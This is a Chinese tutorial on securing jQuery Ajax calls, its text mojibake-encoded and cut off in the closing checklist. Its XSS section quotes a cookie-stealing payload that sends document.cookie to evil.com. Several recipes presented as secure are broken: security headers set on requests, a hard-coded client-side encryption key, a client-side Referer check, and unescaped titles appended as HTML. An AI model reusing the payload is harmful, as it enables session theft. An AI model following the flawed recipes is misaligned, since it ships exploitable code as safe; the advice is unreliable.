---
title: 4ã€jQuery Ajaxå®‰å…¨æœ€ä½³å®è·µ
---
## ğŸ“š ç›®å½•

1. [å®‰å…¨å¨èƒæ¦‚è¿°](#1-å®‰å…¨å¨èƒæ¦‚è¿°)
2. [CSRFæ”»å‡»é˜²æŠ¤](#2-CSRFæ”»å‡»é˜²æŠ¤)
3. [XSSæ”»å‡»é˜²æŠ¤](#3-XSSæ”»å‡»é˜²æŠ¤)
4. [æ•æ„Ÿæ•°æ®ä¼ è¾“å®‰å…¨](#4-æ•æ„Ÿæ•°æ®ä¼ è¾“å®‰å…¨)
5. [Tokenè®¤è¯å®ç°](#5-Tokenè®¤è¯å®ç°)
6. [è¯·æ±‚é¢‘ç‡é™åˆ¶](#6-è¯·æ±‚é¢‘ç‡é™åˆ¶)
7. [æ•°æ®éªŒè¯å’Œè¿‡æ»¤](#7-æ•°æ®éªŒè¯å’Œè¿‡æ»¤)
8. [HTTPSä½¿ç”¨å»ºè®®](#8-HTTPSä½¿ç”¨å»ºè®®)
9. [æ ¸å¿ƒè¦ç‚¹æ€»ç»“](#9-æ ¸å¿ƒè¦ç‚¹æ€»ç»“)

---

## 1. ğŸ›¡ï¸ å®‰å…¨å¨èƒæ¦‚è¿°


### 1.1 ä¸ºä»€ä¹ˆAjaxéœ€è¦å®‰å…¨é˜²æŠ¤


**é€šä¿—ç†è§£**ï¼šå°±åƒä½ å®¶çš„é—¨é”ä¸€æ ·ï¼ŒAjaxè¯·æ±‚æ˜¯ç½‘é¡µä¸æœåŠ¡å™¨äº¤æµçš„"é—¨"ï¼Œå¦‚æœä¸åŠ é˜²æŠ¤ï¼Œåäººå°±èƒ½ï¼š
- å†’å……ä½ å‘é€è¯·æ±‚ï¼ˆCSRFï¼‰
- åœ¨ä½ çš„ç½‘é¡µæ³¨å…¥æ¶æ„ä»£ç ï¼ˆXSSï¼‰
- çªƒå–ä½ çš„æ•æ„Ÿä¿¡æ¯
- æ¶æ„åˆ·çˆ†ä½ çš„æœåŠ¡å™¨

```
ä¸å®‰å…¨çš„Ajaxå°±åƒï¼š
ğŸ  å®¶é—¨ä¸é” â†’ ğŸ˜ˆ å°å·éšæ„è¿›å‡º
ğŸŒ Ajaxä¸é˜²æŠ¤ â†’ ğŸ¦¹â€â™‚ï¸ é»‘å®¢éšæ„æ”»å‡»
```

### 1.2 å¸¸è§çš„å®‰å…¨å¨èƒ


| å¨èƒç±»å‹ | **å«ä¹‰** | **å±å®³** | **é˜²æŠ¤éš¾åº¦** |
|---------|---------|---------|-------------|
| ğŸ­ **CSRF** | `å†’å……ç”¨æˆ·å‘è¯·æ±‚` | `ç›—ç”¨è´¦æˆ·æ“ä½œ` | â­â­â­â˜†â˜† |
| ğŸ’‰ **XSS** | `æ³¨å…¥æ¶æ„è„šæœ¬` | `çªƒå–ç”¨æˆ·ä¿¡æ¯` | â­â­â­â­â˜† |
| ğŸ•µï¸ **æ•°æ®æ³„éœ²** | `ä¼ è¾“æ•°æ®è¢«çªƒå–` | `éšç§ä¿¡æ¯æš´éœ²` | â­â­â˜†â˜†â˜† |
| ğŸŒŠ **è¯·æ±‚æ´ªæ°´** | `æ¶æ„å¤§é‡è¯·æ±‚` | `æœåŠ¡å™¨ç˜«ç—ª` | â­â­â­â˜†â˜† |

---

## 2. ğŸ­ CSRFæ”»å‡»é˜²æŠ¤


### 2.1 ä»€ä¹ˆæ˜¯CSRFæ”»å‡»


**é€šä¿—è§£é‡Š**ï¼šCSRFï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰å°±åƒæœ‰äººå†’å……ä½ çš„èº«ä»½å»é“¶è¡Œå–é’±ã€‚

```
CSRFæ”»å‡»è¿‡ç¨‹ï¼š
1. ä½ ç™»å½•äº†ç½‘é“¶ï¼ˆè·å¾—äº†èº«ä»½å‡­è¯ï¼‰
2. åŒæ—¶æ‰“å¼€äº†æ¶æ„ç½‘ç«™
3. æ¶æ„ç½‘ç«™å·å·ç”¨ä½ çš„èº«ä»½å‘é“¶è¡Œå‘è¯·æ±‚
4. é“¶è¡Œä»¥ä¸ºæ˜¯ä½ æœ¬äººæ“ä½œï¼Œæ‰§è¡Œäº†è½¬è´¦

å®é™…åœºæ™¯ï¼š
ç”¨æˆ·Aè®¿é—®ï¼šbank.comï¼ˆå·²ç™»å½•ï¼‰
åŒæ—¶è®¿é—®ï¼ševil.comï¼ˆæ¶æ„ç½‘ç«™ï¼‰
evil.comå·å·å‘é€ï¼šPOST bank.com/transfer
é“¶è¡Œç³»ç»Ÿï¼šè®¤ä¸ºæ˜¯ç”¨æˆ·Açš„æ­£å¸¸æ“ä½œ âŒ
```

### 2.2 CSRFé˜²æŠ¤å®ç°


**ğŸ”¸ æ–¹æ³•1ï¼šCSRF TokenéªŒè¯**

```javascript
// è·å–CSRF Token
function getCSRFToken() {
    // ä»metaæ ‡ç­¾è·å–token
    return $('meta[name="csrf-token"]').attr('content');
}

// åœ¨Ajaxè¯·æ±‚ä¸­æ·»åŠ token
$.ajaxSetup({
    beforeSend: function(xhr, settings) {
        // ä¸ºæ‰€æœ‰éGETè¯·æ±‚æ·»åŠ CSRF token
        if (settings.type !== 'GET') {
            xhr.setRequestHeader('X-CSRF-TOKEN', getCSRFToken());
        }
    }
});

// ä½¿ç”¨ç¤ºä¾‹
$('#transfer-form').on('submit', function(e) {
    e.preventDefault();
    
    $.ajax({
        url: '/api/transfer',
        type: 'POST',
        data: {
            amount: $('#amount').val(),
            to_account: $('#account').val()
        },
        success: function(response) {
            alert('è½¬è´¦æˆåŠŸï¼');
        }
    });
});
```

**ğŸ”¸ æ–¹æ³•2ï¼šæ£€æŸ¥Refererå¤´**

```javascript
// éªŒè¯è¯·æ±‚æ¥æº
$.ajax({
    url: '/api/sensitive-action',
    type: 'POST',
    data: { action: 'delete_account' },
    beforeSend: function(xhr) {
        // ç¡®ä¿è¯·æ±‚æ¥è‡ªæœ¬ç«™
        if (!document.referrer.includes(window.location.origin)) {
            xhr.abort();
            alert('éæ³•è¯·æ±‚æ¥æº');
            return false;
        }
    }
});
```

### 2.3 é˜²æŠ¤ç­–ç•¥


```
ğŸ›¡ï¸ CSRFé˜²æŠ¤ä¸‰é“é˜²çº¿ï¼š

ç¬¬ä¸€é“ï¼šTokenéªŒè¯
â€¢ æ¯ä¸ªè¡¨å•åŒ…å«å”¯ä¸€token
â€¢ æœåŠ¡å™¨éªŒè¯tokenæœ‰æ•ˆæ€§
â€¢ tokenå®šæœŸæ›´æ–°

ç¬¬äºŒé“ï¼šRefereræ£€æŸ¥  
â€¢ æ£€æŸ¥è¯·æ±‚æ¥æºåŸŸå
â€¢ åªå…è®¸æœ¬ç«™å‘èµ·çš„è¯·æ±‚
â€¢ é˜²æ­¢è·¨ç«™ä¼ªé€ 

ç¬¬ä¸‰é“ï¼šSameSite Cookie
â€¢ è®¾ç½®Cookieçš„SameSiteå±æ€§
â€¢ é™åˆ¶è·¨ç«™è¯·æ±‚æºå¸¦Cookie
â€¢ ç°ä»£æµè§ˆå™¨æ”¯æŒ
```

---

## 3. ğŸ’‰ XSSæ”»å‡»é˜²æŠ¤


### 3.1 ä»€ä¹ˆæ˜¯XSSæ”»å‡»


**é€šä¿—è§£é‡Š**ï¼šXSSï¼ˆè·¨ç«™è„šæœ¬æ”»å‡»ï¼‰å°±åƒåœ¨ä½ çš„ç½‘é¡µé‡Œå·å·æ”¾äº†ä¸ª"çªƒå¬å™¨"ã€‚

```
XSSæ”»å‡»åŸç†ï¼š
åäººåœ¨è¯„è®ºæ¡†è¾“å…¥ï¼š<script>alert('ä½ è¢«æ”»å‡»äº†')</script>
ç½‘é¡µæ˜¾ç¤ºè¯„è®ºæ—¶ï¼šæ‰§è¡Œäº†è¿™æ®µæ¶æ„ä»£ç 
ç»“æœï¼šå¼¹å‡ºè­¦å‘Šæ¡†ï¼ˆå®é™…å¯èƒ½çªƒå–ä½ çš„ä¿¡æ¯ï¼‰

æ›´å±é™©çš„ä¾‹å­ï¼š
æ¶æ„ä»£ç ï¼š<script>
  // çªƒå–ç”¨æˆ·Cookieå‘é€ç»™é»‘å®¢
  fetch('http://evil.com/steal?cookie=' + document.cookie);
</script>
```

### 3.2 XSSé˜²æŠ¤å®ç°


**ğŸ”¸ æ–¹æ³•1ï¼šè¾“å…¥æ•°æ®è½¬ä¹‰**

```javascript
// è½¬ä¹‰HTMLç‰¹æ®Šå­—ç¬¦
function escapeHtml(text) {
    return text
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#039;');
}

// å®‰å…¨æ˜¾ç¤ºç”¨æˆ·è¾“å…¥
function displayUserContent(content) {
    $('#user-content').text(content); // ä½¿ç”¨.text()è€Œä¸æ˜¯.html()
    // æˆ–è€…æ‰‹åŠ¨è½¬ä¹‰
    $('#user-content').html(escapeHtml(content));
}

// Ajaxè·å–ç”¨æˆ·è¯„è®º
$.get('/api/comments', function(comments) {
    comments.forEach(function(comment) {
        // âœ… å®‰å…¨æ–¹å¼ï¼šè½¬ä¹‰åæ˜¾ç¤º
        $('#comments').append(
            '<div class="comment">' + 
            escapeHtml(comment.content) + 
            '</div>'
        );
    });
});
```

**ğŸ”¸ æ–¹æ³•2ï¼šå†…å®¹å®‰å…¨ç­–ç•¥ï¼ˆCSPï¼‰**

```html
<!-- åœ¨HTMLå¤´éƒ¨è®¾ç½®CSP -->
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self' 'unsafe-inline'">
```

```javascript
// åœ¨Ajaxå“åº”ä¸­è®¾ç½®CSPå¤´
$.ajaxSetup({
    beforeSend: function(xhr) {
        xhr.setRequestHeader('Content-Security-Policy', 
            "default-src 'self'; script-src 'self'");
    }
});
```

### 3.3 å®‰å…¨ç¼–ç å®è·µ


```javascript
// âŒ å±é™©åšæ³•ï¼šç›´æ¥ä½¿ç”¨ç”¨æˆ·è¾“å…¥
function badExample(userInput) {
    $('#content').html(userInput); // å¯èƒ½æ‰§è¡Œæ¶æ„è„šæœ¬
}

// âœ… å®‰å…¨åšæ³•ï¼šéªŒè¯å’Œè½¬ä¹‰
function safeExample(userInput) {
    // 1. éªŒè¯è¾“å…¥æ ¼å¼
    if (typeof userInput !== 'string' || userInput.length > 1000) {
        throw new Error('æ— æ•ˆè¾“å…¥');
    }
    
    // 2. è½¬ä¹‰ç‰¹æ®Šå­—ç¬¦
    const safeContent = escapeHtml(userInput);
    
    // 3. å®‰å…¨æ˜¾ç¤º
    $('#content').text(safeContent);
}
```

---

## 4. ğŸ” æ•æ„Ÿæ•°æ®ä¼ è¾“å®‰å…¨


### 4.1 ä»€ä¹ˆæ˜¯æ•æ„Ÿæ•°æ®


**é€šä¿—ç†è§£**ï¼šæ•æ„Ÿæ•°æ®å°±åƒä½ çš„èº«ä»½è¯ã€é“¶è¡Œå¡å¯†ç ï¼Œç»å¯¹ä¸èƒ½è®©åˆ«äººçœ‹åˆ°ã€‚

```
ğŸ” æ•æ„Ÿæ•°æ®åŒ…æ‹¬ï¼š
â€¢ å¯†ç ã€èº«ä»½è¯å·
â€¢ é“¶è¡Œå¡ä¿¡æ¯ã€æ”¯ä»˜æ•°æ®  
â€¢ ä¸ªäººéšç§ä¿¡æ¯
â€¢ å•†ä¸šæœºå¯†æ•°æ®
â€¢ ç”¨æˆ·è¡Œä¸ºæ•°æ®
```

### 4.2 å®‰å…¨ä¼ è¾“å®ç°


**ğŸ”¸ å‰ç«¯æ•°æ®åŠ å¯†**

```javascript
// ä½¿ç”¨CryptoJSè¿›è¡ŒAESåŠ å¯†ï¼ˆéœ€å¼•å…¥crypto-jsåº“ï¼‰
function encryptData(data, key) {
    return CryptoJS.AES.encrypt(JSON.stringify(data), key).toString();
}

// æ•æ„Ÿæ•°æ®æäº¤
$('#login-form').on('submit', function(e) {
    e.preventDefault();
    
    const password = $('#password').val();
    const encryptKey = 'your-secret-key'; // å®é™…åº”ç”¨ä¸­ä»æœåŠ¡å™¨è·å–
    
    $.ajax({
        url: '/api/login',
        type: 'POST',
        data: {
            username: $('#username').val(),
            password: encryptData(password, encryptKey) // åŠ å¯†å¯†ç 
        },
        success: function(response) {
            if (response.success) {
                window.location.href = '/dashboard';
            }
        }
    });
});
```

**ğŸ”¸ æ•°æ®è„±æ•æ˜¾ç¤º**

```javascript
// æ•æ„Ÿä¿¡æ¯è„±æ•å¤„ç†
function maskSensitiveData(data, type) {
    switch(type) {
        case 'phone':
            return data.replace(/(\d{3})\d{4}(\d{4})/, '$1****$2');
        case 'email':
            return data.replace(/(.{2}).*(@.*)/, '$1****$2');
        case 'idcard':
            return data.replace(/(\d{6})\d{8}(\d{4})/, '$1********$2');
        default:
            return '****';
    }
}

// æ˜¾ç¤ºç”¨æˆ·ä¿¡æ¯
$.get('/api/user-info', function(user) {
    $('#phone').text(maskSensitiveData(user.phone, 'phone'));
    $('#email').text(maskSensitiveData(user.email, 'email'));
});
```

### 4.3 ä¼ è¾“å®‰å…¨æ£€æŸ¥


```javascript
// æ£€æŸ¥è¿æ¥å®‰å…¨æ€§
function checkConnectionSecurity() {
    if (location.protocol !== 'https:') {
        alert('âš ï¸ å½“å‰è¿æ¥ä¸å®‰å…¨ï¼Œè¯·ä½¿ç”¨HTTPSè®¿é—®');
        return false;
    }
    return true;
}

// å®‰å…¨çš„Ajaxè¯·æ±‚
function secureAjaxRequest(options) {
    if (!checkConnectionSecurity()) {
        return;
    }
    
    // æ·»åŠ å®‰å…¨å¤´
    options.beforeSend = function(xhr) {
        xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
    };
    
    return $.ajax(options);
}
```

---

## 5. ğŸŸï¸ Tokenè®¤è¯å®ç°


### 5.1 ä»€ä¹ˆæ˜¯Tokenè®¤è¯


**é€šä¿—ç†è§£**ï¼šTokenå°±åƒç”µå½±ç¥¨ï¼Œæœ‰äº†ç¥¨æ‰èƒ½è¿›ç”µå½±é™¢ï¼Œè¿‡æœŸäº†å°±è¦é‡æ–°ä¹°ç¥¨ã€‚

```
Tokenè®¤è¯æµç¨‹ï¼š
1. ç”¨æˆ·ç™»å½• â†’ æœåŠ¡å™¨ç»™ä¸€å¼ "ç¥¨"ï¼ˆTokenï¼‰
2. ä»¥åæ¯æ¬¡è¯·æ±‚éƒ½å¸¦ç€è¿™å¼ "ç¥¨"
3. æœåŠ¡å™¨æ£€æŸ¥"ç¥¨"æ˜¯å¦æœ‰æ•ˆ
4. ç¥¨è¿‡æœŸäº†å°±éœ€è¦é‡æ–°ç™»å½•æ‹¿æ–°ç¥¨

ä¼ ç»Ÿè®¤è¯ vs Tokenè®¤è¯ï¼š
ä¼ ç»Ÿï¼šæ¯æ¬¡éƒ½è¦è¾“å…¥è´¦å·å¯†ç  ğŸ˜«
Tokenï¼šç™»å½•ä¸€æ¬¡ï¼Œåˆ°å¤„ä½¿ç”¨ ğŸ˜Š
```

### 5.2 JWT Tokenå®ç°


```javascript
// Tokenç®¡ç†å™¨
const TokenManager = {
    // å­˜å‚¨token
    setToken: function(token) {
        localStorage.setItem('auth_token', token);
    },
    
    // è·å–token
    getToken: function() {
        return localStorage.getItem('auth_token');
    },
    
    // åˆ é™¤token
    removeToken: function() {
        localStorage.removeItem('auth_token');
    },
    
    // æ£€æŸ¥tokenæ˜¯å¦è¿‡æœŸ
    isTokenValid: function() {
        const token = this.getToken();
        if (!token) return false;
        
        try {
            // ç®€å•è§£æJWT payloadï¼ˆå®é™…åº”ç”¨éœ€è¦éªŒè¯ç­¾åï¼‰
            const payload = JSON.parse(atob(token.split('.')[1]));
            return payload.exp * 1000 > Date.now();
        } catch (e) {
            return false;
        }
    }
};

// ç™»å½•è·å–token
$('#login-form').on('submit', function(e) {
    e.preventDefault();
    
    $.ajax({
        url: '/api/login',
        type: 'POST',
        data: {
            username: $('#username').val(),
            password: $('#password').val()
        },
        success: function(response) {
            if (response.token) {
                TokenManager.setToken(response.token);
                alert('ç™»å½•æˆåŠŸï¼');
            }
        }
    });
});
```

### 5.3 è‡ªåŠ¨Tokenç®¡ç†


```javascript
// ä¸ºæ‰€æœ‰Ajaxè¯·æ±‚è‡ªåŠ¨æ·»åŠ token
$.ajaxSetup({
    beforeSend: function(xhr, settings) {
        const token = TokenManager.getToken();
        
        // æ£€æŸ¥tokenæœ‰æ•ˆæ€§
        if (!TokenManager.isTokenValid()) {
            TokenManager.removeToken();
            alert('ç™»å½•å·²è¿‡æœŸï¼Œè¯·é‡æ–°ç™»å½•');
            window.location.href = '/login';
            return false;
        }
        
        // æ·»åŠ Authorizationå¤´
        if (token) {
            xhr.setRequestHeader('Authorization', 'Bearer ' + token);
        }
    }
});

// å¤„ç†tokenè¿‡æœŸå“åº”
$(document).ajaxError(function(event, xhr) {
    if (xhr.status === 401) {
        TokenManager.removeToken();
        alert('èº«ä»½éªŒè¯å·²è¿‡æœŸï¼Œè¯·é‡æ–°ç™»å½•');
        window.location.href = '/login';
    }
});
```

---

## 6. ğŸš¦ è¯·æ±‚é¢‘ç‡é™åˆ¶


### 6.1 ä¸ºä»€ä¹ˆéœ€è¦é¢‘ç‡é™åˆ¶


**é€šä¿—ç†è§£**ï¼šå°±åƒé“¶è¡ŒATMå–æ¬¾æœ‰æ¯æ—¥é™é¢ï¼Œé˜²æ­¢ä½ çš„å¡è¢«ç›—åˆ·åæŸå¤±å¤ªå¤§ã€‚

```
æ²¡æœ‰é¢‘ç‡é™åˆ¶çš„å±å®³ï¼š
ğŸ˜ˆ æ¶æ„ç”¨æˆ·ç–¯ç‹‚åˆ·æ–° â†’ æœåŠ¡å™¨å´©æºƒ
ğŸ¤– çˆ¬è™«ç¨‹åºç‹‚çˆ¬æ•°æ® â†’ å¸¦å®½è€—å°½  
ğŸ¦¹â€â™‚ï¸ é»‘å®¢æš´åŠ›ç ´è§£å¯†ç  â†’ è´¦æˆ·è¢«ç›—
ğŸ’¸ æ¶æ„åˆ·å•åˆ·ç§¯åˆ† â†’ ç»æµæŸå¤±
```

### 6.2 å‰ç«¯é¢‘ç‡æ§åˆ¶


**ğŸ”¸ é˜²æŠ–å®ç°ï¼ˆDebounceï¼‰**

```javascript
// é˜²æŠ–å‡½æ•°ï¼šé¢‘ç¹æ“ä½œæ—¶åªæ‰§è¡Œæœ€åä¸€æ¬¡
function debounce(func, wait) {
    let timeout;
    return function() {
        const context = this;
        const args = arguments;
        
        clearTimeout(timeout);
        timeout = setTimeout(function() {
            func.apply(context, args);
        }, wait);
    };
}

// æœç´¢æ¡†é˜²æŠ–
const searchDebounced = debounce(function() {
    const keyword = $('#search').val();
    if (keyword.length > 2) {
        $.get('/api/search', { q: keyword }, function(results) {
            $('#search-results').html('');
            results.forEach(function(item) {
                $('#search-results').append('<div>' + item.title + '</div>');
            });
        });
    }
}, 300); // 300msåæ‰§è¡Œ

$('#search').on('input', searchDebounced);
```

**ğŸ”¸ èŠ‚æµå®ç°ï¼ˆThrottleï¼‰**

```javascript
// èŠ‚æµå‡½æ•°ï¼šé™åˆ¶æ‰§è¡Œé¢‘ç‡
function throttle(func, wait) {
    let timeout;
    let previous = 0;
    
    return function() {
        const now = Date.now();
        const context = this;
        const args = arguments;
        
        if (now - previous > wait) {
            if (timeout) {
                clearTimeout(timeout);
                timeout = null;
            }
            func.apply(context, args);
            previous = now;
        } else if (!timeout) {
            timeout = setTimeout(function() {
                func.apply(context, args);
                previous = Date.now();
                timeout = null;
            }, wait - (now - previous));
        }
    };
}

// æ»šåŠ¨åŠ è½½èŠ‚æµ
const loadMoreThrottled = throttle(function() {
    $.get('/api/posts', { page: currentPage + 1 }, function(posts) {
        posts.forEach(function(post) {
            $('#posts').append('<div>' + post.title + '</div>');
        });
        currentPage++;
    });
}, 1000); // 1ç§’æœ€å¤šæ‰§è¡Œä¸€æ¬¡

$(window).on('scroll', function() {
    if ($(window).scrollTop() + $(window).height() >= $(document).height() - 100) {
        loadMoreThrottled();
    }
});
```

### 6.3 è¯·æ±‚é‡å¤æ£€æµ‹


```javascript
// é˜²æ­¢é‡å¤æäº¤
const PendingRequests = {
    requests: new Set(),
    
    // ç”Ÿæˆè¯·æ±‚æ ‡è¯†
    getRequestId: function(url, data) {
        return url + ':' + JSON.stringify(data);
    },
    
    // æ£€æŸ¥æ˜¯å¦é‡å¤è¯·æ±‚
    isDuplicate: function(url, data) {
        const id = this.getRequestId(url, data);
        if (this.requests.has(id)) {
            return true;
        }
        this.requests.add(id);
        return false;
    },
    
    // å®Œæˆè¯·æ±‚åç§»é™¤æ ‡è¯†
    complete: function(url, data) {
        const id = this.getRequestId(url, data);
        this.requests.delete(id);
    }
};

// å®‰å…¨çš„Ajaxè¯·æ±‚
function safeAjaxRequest(options) {
    // æ£€æŸ¥é‡å¤è¯·æ±‚
    if (PendingRequests.isDuplicate(options.url, options.data)) {
        console.log('é‡å¤è¯·æ±‚å·²å¿½ç•¥');
        return;
    }
    
    const originalComplete = options.complete;
    options.complete = function() {
        PendingRequests.complete(options.url, options.data);
        if (originalComplete) {
            originalComplete.apply(this, arguments);
        }
    };
    
    return $.ajax(options);
}
```

---

## 7. âœ… æ•°æ®éªŒè¯å’Œè¿‡æ»¤


### 7.1 ä¸ºä»€ä¹ˆéœ€è¦æ•°æ®éªŒè¯


**é€šä¿—ç†è§£**ï¼šæ•°æ®éªŒè¯å°±åƒå®‰æ£€ï¼Œç¡®ä¿è¿›å…¥ç³»ç»Ÿçš„éƒ½æ˜¯"å¥½äººå¥½æ•°æ®"ã€‚

```
ä¸éªŒè¯æ•°æ®çš„åæœï¼š
ğŸ—‘ï¸ åƒåœ¾æ•°æ®ï¼š123abc@é‚®ç®±æ ¼å¼
ğŸ’£ æ¶æ„æ•°æ®ï¼š<script>alert('æ”»å‡»')</script>
ğŸ”¢ é”™è¯¯æ•°æ®ï¼šå¹´é¾„è¾“å…¥-100å²
ğŸ“ è¶…é•¿æ•°æ®ï¼šç”¨æˆ·å10000ä¸ªå­—ç¬¦
```

### 7.2 å‰ç«¯æ•°æ®éªŒè¯


**ğŸ”¸ åŸºç¡€éªŒè¯å‡½æ•°**

```javascript
// éªŒè¯å·¥å…·é›†
const Validator = {
    // é‚®ç®±éªŒè¯
    isEmail: function(email) {
        const pattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return pattern.test(email);
    },
    
    // æ‰‹æœºå·éªŒè¯
    isPhone: function(phone) {
        const pattern = /^1[3-9]\d{9}$/;
        return pattern.test(phone);
    },
    
    // å¯†ç å¼ºåº¦éªŒè¯
    isStrongPassword: function(password) {
        // è‡³å°‘8ä½ï¼ŒåŒ…å«å¤§å°å†™å­—æ¯å’Œæ•°å­—
        const pattern = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)[a-zA-Z\d@$!%*?&]{8,}$/;
        return pattern.test(password);
    },
    
    // é•¿åº¦éªŒè¯
    isValidLength: function(str, min, max) {
        return str.length >= min && str.length <= max;
    },
    
    // æ•°å­—èŒƒå›´éªŒè¯
    isInRange: function(num, min, max) {
        return num >= min && num <= max;
    }
};

// è¡¨å•éªŒè¯ç¤ºä¾‹
$('#register-form').on('submit', function(e) {
    e.preventDefault();
    
    const email = $('#email').val();
    const password = $('#password').val();
    const age = parseInt($('#age').val());
    
    // éªŒè¯é‚®ç®±
    if (!Validator.isEmail(email)) {
        alert('è¯·è¾“å…¥æ­£ç¡®çš„é‚®ç®±æ ¼å¼');
        return;
    }
    
    // éªŒè¯å¯†ç å¼ºåº¦
    if (!Validator.isStrongPassword(password)) {
        alert('å¯†ç å¿…é¡»åŒ…å«å¤§å°å†™å­—æ¯å’Œæ•°å­—ï¼Œè‡³å°‘8ä½');
        return;
    }
    
    // éªŒè¯å¹´é¾„èŒƒå›´
    if (!Validator.isInRange(age, 1, 120)) {
        alert('å¹´é¾„å¿…é¡»åœ¨1-120ä¹‹é—´');
        return;
    }
    
    // æ•°æ®éªŒè¯é€šè¿‡ï¼Œæäº¤è¯·æ±‚
    $.ajax({
        url: '/api/register',
        type: 'POST',
        data: {
            email: email,
            password: password,
            age: age
        },
        success: function(response) {
            alert('æ³¨å†ŒæˆåŠŸï¼');
        }
    });
});
```

### 7.3 æ•°æ®æ¸…ç†å’Œè¿‡æ»¤


```javascript
// æ•°æ®æ¸…ç†å·¥å…·
const DataCleaner = {
    // ç§»é™¤å±é™©å­—ç¬¦
    removeDangerousChars: function(str) {
        return str.replace(/[<>'"&]/g, '');
    },
    
    // é™åˆ¶å­—ç¬¦ä¸²é•¿åº¦
    limitLength: function(str, maxLength) {
        return str.length > maxLength ? str.substring(0, maxLength) : str;
    },
    
    // ç§»é™¤å¤šä½™ç©ºæ ¼
    trimSpaces: function(str) {
        return str.replace(/\s+/g, ' ').trim();
    },
    
    // æ•°å­—æ¸…ç†
    cleanNumber: function(value) {
        const num = parseFloat(value);
        return isNaN(num) ? 0 : num;
    }
};

// æ¸…ç†è¡¨å•æ•°æ®
function cleanFormData(formData) {
    const cleaned = {};
    
    for (let key in formData) {
        let value = formData[key];
        
        if (typeof value === 'string') {
            value = DataCleaner.trimSpaces(value);
            value = DataCleaner.removeDangerousChars(value);
            value = DataCleaner.limitLength(value, 1000);
        } else if (typeof value === 'number') {
            value = DataCleaner.cleanNumber(value);
        }
        
        cleaned[key] = value;
    }
    
    return cleaned;
}
```

---

## 8. ğŸ”’ HTTPSä½¿ç”¨å»ºè®®


### 8.1 ä¸ºä»€ä¹ˆå¿…é¡»ä½¿ç”¨HTTPS


**é€šä¿—ç†è§£**ï¼šHTTPå°±åƒæ˜ä¿¡ç‰‡ï¼Œå†…å®¹è°éƒ½èƒ½çœ‹åˆ°ï¼›HTTPSå°±åƒå¯†å°ä¿¡å°ï¼Œåªæœ‰æ”¶ä»¶äººèƒ½æ‰“å¼€ã€‚

```
HTTP vs HTTPSå¯¹æ¯”ï¼š

HTTPä¼ è¾“ï¼š
ç”¨æˆ· â†’ [å¯†ç :123456] â†’ æœåŠ¡å™¨
     â†—ï¸ é»‘å®¢èƒ½çœ‹åˆ°å¯†ç  ğŸ˜ˆ

HTTPSä¼ è¾“ï¼š  
ç”¨æˆ· â†’ [åŠ å¯†æ•°æ®] â†’ æœåŠ¡å™¨
     â†—ï¸ é»‘å®¢åªçœ‹åˆ°ä¹±ç  ğŸ˜µâ€ğŸ’«
```

### 8.2 å¼ºåˆ¶HTTPSå®ç°


```javascript
// æ£€æŸ¥å¹¶å¼ºåˆ¶ä½¿ç”¨HTTPS
function enforceHTTPS() {
    if (location.protocol !== 'https:' && location.hostname !== 'localhost') {
        // è‡ªåŠ¨è·³è½¬åˆ°HTTPS
        location.replace('https:' + window.location.href.substring(window.location.protocol.length));
        return false;
    }
    return true;
}

// é¡µé¢åŠ è½½æ—¶æ£€æŸ¥
$(document).ready(function() {
    if (!enforceHTTPS()) {
        return; // è·³è½¬ä¸­ï¼Œåœæ­¢æ‰§è¡Œ
    }
    
    // ç¡®ä¿æ‰€æœ‰Ajaxè¯·æ±‚ä½¿ç”¨HTTPS
    $.ajaxSetup({
        beforeSend: function(xhr, settings) {
            if (settings.url.startsWith('http://')) {
                settings.url = settings.url.replace('http://', 'https://');
            }
        }
    });
});
```

### 8.3 å®‰å…¨ä¼ è¾“é…ç½®


```javascript
// å®‰å…¨çš„Ajaxé…ç½®
const secureAjaxDefaults = {
    // ç¡®ä¿ä½¿ç”¨å®‰å…¨åè®®
    beforeSend: function(xhr) {
        // æ·»åŠ å®‰å…¨å¤´
        xhr.setRequestHeader('Strict-Transport-Security', 'max-age=31536000');
        xhr.setRequestHeader('X-Content-Type-Options', 'nosniff');
        xhr.setRequestHeader('X-Frame-Options', 'DENY');
    },
    
    // é”™è¯¯å¤„ç†
    error: function(xhr, status, error) {
        if (xhr.status === 0) {
            alert('ç½‘ç»œè¿æ¥ä¸å®‰å…¨ï¼Œè¯·æ£€æŸ¥HTTPSè®¾ç½®');
        }
    }
};

// åº”ç”¨å®‰å…¨é…ç½®
$.ajaxSetup(secureAjaxDefaults);
```

---

## 9. ğŸ“‹ æ ¸å¿ƒè¦ç‚¹æ€»ç»“


### 9.1 å¿…é¡»æŒæ¡çš„å®‰å…¨åŸåˆ™


```
ğŸ”¸ æ°¸è¿œä¸ä¿¡ä»»ç”¨æˆ·è¾“å…¥ï¼šæ‰€æœ‰æ•°æ®éƒ½è¦éªŒè¯å’Œè¿‡æ»¤
ğŸ”¸ ä½¿ç”¨HTTPSä¼ è¾“ï¼šä¿æŠ¤æ•°æ®ä¼ è¾“å®‰å…¨  
ğŸ”¸ å®æ–½Tokenè®¤è¯ï¼šé¿å…å¯†ç é‡å¤ä¼ è¾“
ğŸ”¸ é˜²æŠ¤CSRFæ”»å‡»ï¼šéªŒè¯è¯·æ±‚æ¥æºå’Œæ·»åŠ token
ğŸ”¸ é˜²æŠ¤XSSæ”»å‡»ï¼šè½¬ä¹‰ç”¨æˆ·è¾“å…¥å†…å®¹
ğŸ”¸ é™åˆ¶è¯·æ±‚é¢‘ç‡ï¼šé˜²æ­¢æ¶æ„åˆ·é‡æ”»å‡»
ğŸ”¸ æ•æ„Ÿæ•°æ®åŠ å¯†ï¼šé‡è¦ä¿¡æ¯ä¸æ˜æ–‡ä¼ è¾“
```

### 9.2 å®‰å…¨æ£€æŸ¥æ¸…å•


**ğŸ”¹ å¼€å‘é˜¶æ®µæ£€æŸ¥**
```
âœ… æ‰€æœ‰è¡¨å•éƒ½æœ‰CSRFä¿æŠ¤
âœ… ç”¨æˆ·è¾“å…¥éƒ½ç»è¿‡éªŒè¯å’Œè½¬ä¹‰
âœ… æ•æ„Ÿæ•°æ®ä¼ è¾“å·²åŠ å¯†
âœ… å®æ–½äº†è¯·æ±‚é¢‘ç‡é™åˆ¶
